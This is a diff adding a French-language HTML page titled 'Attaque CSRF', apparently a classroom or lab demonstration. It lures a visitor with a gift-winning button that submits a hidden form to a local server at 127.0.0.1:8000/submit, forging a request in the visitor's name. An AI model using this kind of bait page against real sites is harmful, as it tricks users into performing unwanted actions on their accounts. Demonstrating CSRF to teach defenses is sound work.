@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Attaque CSRF</title>
+    </head>
+    <body>
+        <h2>Tu ne te rends compte de rien...</h2>
+        <form method="POST" action="http://127.0.0.1:8000/submit">
+            <input type="hidden" name="name" value="Hacker" />
+            <button type="submit">Clique ici pour gagner un cadeau !</button>
+        </form>
+    </body>
+</html>
